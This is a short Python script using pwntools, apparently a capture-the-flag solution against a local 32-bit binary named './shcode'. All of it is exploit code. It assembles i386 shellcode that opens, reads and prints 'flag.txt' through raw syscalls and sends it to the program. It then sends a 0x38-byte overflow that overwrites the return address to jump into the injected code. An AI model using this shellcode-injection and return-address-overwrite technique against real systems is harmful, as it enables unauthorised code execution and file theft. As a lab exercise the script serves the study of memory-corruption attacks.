from pwn import *

context.arch = "i386"
context.terminal = ['kitty', '-e', 'sh', '-c']

shellcode = asm("""
        mov eax,5
        mov ebx,0x804b3c0
        mov ecx,4
        int 0x80

        mov ebx,eax
        lea ecx,[esp]
        mov eax,3
        int 0x80

        mov eax,4
        mov ebx,1
        mov edx,18
        int 0x80
    """).ljust(0x100,'\x00') + "flag.txt\x00"

io = process('./shcode')

print(io.recv().decode())
io.sendline(shellcode)
print(io.recv().decode())
#gdb.attach(io)
io.sendline('A' * 0x38 + '\xc0\xb2\x04\x08')
#io.interactive()
print(io.recv())
